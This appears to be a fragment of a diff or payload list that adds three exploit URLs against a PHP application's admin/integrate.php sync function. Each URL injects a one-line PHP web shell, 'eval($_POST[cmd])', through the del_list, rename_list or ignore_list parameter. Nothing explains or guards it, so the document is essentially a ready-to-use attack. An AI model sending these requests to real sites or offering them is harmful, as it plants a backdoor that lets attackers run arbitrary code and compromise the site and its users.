@@ -1,0 +1,3 @@
+http://www.example.com/admin/integrate.php?act=sync&del_list=&lt;?php%20eval($_POST[cmd])?&gt;
+http://www.example.com/admin/integrate.php?act=sync&rename_list=&lt;?php%20eval($_POST[cmd])?&gt;
+http://www.example.com/admin/integrate.php?act=sync&ignore_list=&lt;?php%20eval($_POST[cmd])?&gt;
